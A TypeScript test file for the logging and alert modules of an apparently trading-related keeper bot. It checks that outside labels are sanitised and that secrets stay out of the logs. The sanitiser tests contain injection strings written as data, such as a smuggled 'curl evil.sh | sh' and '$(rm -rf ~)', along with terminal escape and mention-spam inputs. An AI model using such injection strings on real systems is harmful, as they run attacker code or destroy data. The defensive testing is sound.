import { describe, expect, it } from "vitest";
import { AlertsConfig } from "../src/config/index.js";
import { Alerter } from "../src/observe/alerts.js";
import { formatMessage, getLogger, printable, safeLabel, setup } from "../src/observe/logs.js";

describe("logs", () => {
  it("fills %-templates the way Python's logging does", () => {
    expect(formatMessage("%s %s: sent %s (%d)", ["liquidation", "-", "0xab", 3.7]).text).toBe("liquidation -: sent 0xab (3)");
    expect(formatMessage("100% sure", []).text).toBe("100% sure"); // no args: not formatted
    const e = new Error("boom");
    const f = formatMessage("failed: %s", [e, e]);
    expect(f.text).toBe("failed: boom");
    expect(f.exc).toBe(e);
    expect(formatMessage("big %s", [2n ** 70n]).text).toBe("big 1180591620717411303424");
  });

  it("shows an outside name without control characters, shell metacharacters or mentions", () => {
    expect(safeLabel("BTC/USD")).toBe("BTC/USD");
    expect(safeLabel("Gold, spot")).toBe("Gold, spot");
    expect(safeLabel("1000PEPE/USD")).toBe("1000PEPE/USD");
    expect(safeLabel("BTC/USD; curl evil.sh | sh #")).toBe("BTC/USD curl evil.sh sh");
    expect(safeLabel("$(rm -rf ~)`id`")).toBe("rm -rf id");
    expect(safeLabel("\x1b[31mBTC/USD\x1b[0m\n@everyone")).toBe("31mBTC/USD 0m everyone");
    expect(safeLabel("ETH‮/USD​")).toBe("ETH /USD");
    expect(safeLabel("x".repeat(100))).toHaveLength(40);
    expect(safeLabel("   ")).toBe("");
    expect(printable("a\x1b[2J\r\nb⁦c")).toBe("a[2Jbc");
  });

  it("writes JSON lines and respects the level", () => {
    const lines: string[] = [];
    setup("info", "json", (l) => lines.push(l));
    const log = getLogger("bazaar_sdk.test");
    log.debug("hidden");
    log.info("shown %s", "x");
    log.warning("with trace", new Error("bad"));
    expect(lines).toHaveLength(2);
    const a = JSON.parse(lines[0]!);
    expect(a).toMatchObject({ level: "info", logger: "bazaar_sdk.test", msg: "shown x" });
    expect(typeof a.ts).toBe("number");
    const b = JSON.parse(lines[1]!);
    expect(b.msg).toBe("with trace");
    expect(b.exc).toMatch(/^Error: bad/);
    setup("warning", "pretty", (l) => lines.push(l));
    log.info("hidden");
    log.error("plain");
    expect(lines).toHaveLength(3);
    expect(lines[2]).toMatch(/ERROR.*plain$/);
  });
});

describe("alerts", () => {
  const TOKEN = "123456789:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw";
  const HOOK = "https://discord.com/api/webhooks/123456789012345678/AbCdEfGhIjKlMnOpQrStUvWxYz0123456789";
  const OWN = "https://alerts.example/hook/s3cr3t-path";

  function make(fail: (url: string) => Response | Error | null) {
    const posts: { url: string; body: unknown }[] = [];
    const fetchFn = (async (url: string, init: RequestInit) => {
      posts.push({ url, body: JSON.parse(String(init.body)) });
      const r = fail(url);
      if (r instanceof Error) throw r;
      return r ?? new Response("{}");
    }) as unknown as typeof fetch;
    const cfg = AlertsConfig.parse({ telegram: { botToken: TOKEN, chatId: "42" }, discord: { webhook: HOOK }, webhook: { url: OWN } });
    return { posts, alerts: new Alerter(cfg, "Bazaar keeper", { fetch: fetchFn }) };
  }

  it("posts to every channel, suppresses repeats, and skips kinds not asked for", async () => {
    const { posts, alerts } = make(() => null);
    expect(alerts.configured).toBe(true);
    await alerts.send("lowBalance", "wallet default holds 0.001 ETH");
    expect(posts.map((p) => p.url)).toEqual([`https://api.telegram.org/bot${TOKEN}/sendMessage`, HOOK, OWN]);
    expect(posts[0]!.body).toEqual({ chat_id: "42", text: "Bazaar keeper: wallet default holds 0.001 ETH" });
    // Discord pings nobody, whatever the text says.
    expect(posts[1]!.body).toEqual({ content: "Bazaar keeper: wallet default holds 0.001 ETH", allowed_mentions: { parse: [] } });
    expect(posts[2]!.body).toMatchObject({ kind: "lowBalance", message: "wallet default holds 0.001 ETH" });
    await alerts.send("lowBalance", "wallet default holds 0.001 ETH");
    expect(posts).toHaveLength(3);
    await alerts.send("lowBalance", "wallet default holds 0.001 ETH", { repeatAfter: 0 });
    expect(posts).toHaveLength(6);
    await alerts.send("action", "not in notify by default");
    expect(posts).toHaveLength(6);
  });

  it("sends no control characters, and lets nobody be pinged", async () => {
    const { posts, alerts } = make(() => null);
    await alerts.send("opportunity", "terminateStalePair \x1b[2J@everyone‮ BTC/USD\r\nfake line: ready now");
    for (const p of posts) expect(JSON.stringify(p.body)).not.toMatch(/\\u001b|\\r|\\n|‮/);
    expect(posts[0]!.body).toEqual({ chat_id: "42", text: "Bazaar keeper: terminateStalePair [2J@everyone BTC/USDfake line: ready now" });
    expect(posts[1]!.body).toMatchObject({ allowed_mentions: { parse: [] } });
  });

  it("never logs a bot token or a webhook URL, and one channel's failure does not stop the others", async () => {
    const lines: string[] = [];
    setup("debug", "json", (l) => lines.push(l));
    const { posts, alerts } = make((url) =>
      url.includes("telegram")
        ? new TypeError(`Failed to parse URL from ${url}`)
        : url === HOOK
          ? Object.assign(new TypeError("fetch failed"), { cause: { message: `connect to ${HOOK} refused` } })
          : new Response("no", { status: 500 }),
    );
    await alerts.send("jobPaused", "liquidation paused");
    expect(posts).toHaveLength(3);
    const text = lines.join("\n");
    expect(text).toContain("could not deliver an alert to telegram");
    expect(text).toContain("could not deliver an alert to discord");
    expect(text).toContain("could not deliver an alert to webhook: HTTP 500");
    for (const secret of [TOKEN, "AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw", HOOK, "AbCdEfGhIjKlMnOpQrStUvWxYz0123456789", OWN, "s3cr3t-path"]) {
      expect(text).not.toContain(secret);
    }
  });
});
